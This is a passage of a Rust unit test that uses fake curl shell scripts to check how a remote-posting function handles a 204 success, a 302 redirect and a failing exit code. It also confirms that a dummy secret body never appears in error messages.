    #[test]
    fn remote_transport_enforces_success_and_does_not_echo_the_body() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        let make_client = |name: &str, script: &str| {
            let client = dir.path().join(name);
            std::fs::write(&client, script).unwrap();
            std::fs::set_permissions(&client, std::fs::Permissions::from_mode(0o700)).unwrap();
            client
        };
        let success_client = make_client(
            "curl-success-fixture",
            "#!/bin/sh\n[ \"$(cat)\" = 'sealed-secret' ] || exit 64\nprintf '204'\n",
        );
        assert!(post_remote_with(
            success_client.as_os_str(),
            "https://fixture.invalid",
            "sealed-secret"
        )
        .is_ok());

        let redirect_client = make_client(
            "curl-redirect-fixture",
            "#!/bin/sh\ncat >/dev/null\nprintf '302'\n",
        );
        let error = post_remote_with(
            redirect_client.as_os_str(),
            "https://fixture.invalid",
            "sealed-secret",
        )
        .unwrap_err()
        .to_string();
        assert!(error.contains("HTTP status 302"));

        let rejected_client = make_client(
            "curl-rejected-fixture",
            "#!/bin/sh\ncat >/dev/null\necho 'fixture transport rejected' >&2\nexit 22\n",
        );
        let error = post_remote_with(
            rejected_client.as_os_str(),
            "https://fixture.invalid",
            "sealed-secret",
        )
        .unwrap_err()
        .to_string();
        assert!(error.contains("status 22"));
        assert!(error.contains("fixture transport rejected"));
        assert!(!error.contains("sealed-secret"));
    }
}
